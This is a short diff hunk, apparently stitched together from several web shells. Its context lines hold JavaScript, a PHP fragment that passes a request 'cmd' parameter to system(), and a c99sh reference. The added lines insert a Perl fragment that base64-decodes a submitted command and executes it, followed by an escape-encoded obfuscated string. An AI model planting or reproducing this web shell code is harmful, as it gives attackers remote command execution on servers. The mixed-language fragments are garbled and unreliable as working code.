@@ -48,3 +48,5 @@ makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
 if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd);
 if ($surl_autofill_include and !$_REQUEST["c99sh_surl"])
+$in{$key} .= $val;}if($in{"cmd"}){print decode_base64($in{"check"})."<pre>";system(decode_base64($in{"cmd"}));
+\74\x63\145\156\x74\x65\x72\76\74\146\x6f\x6e\164\40\x63\157\154\157\x72\x3d\47\x72\145\x64\47\76
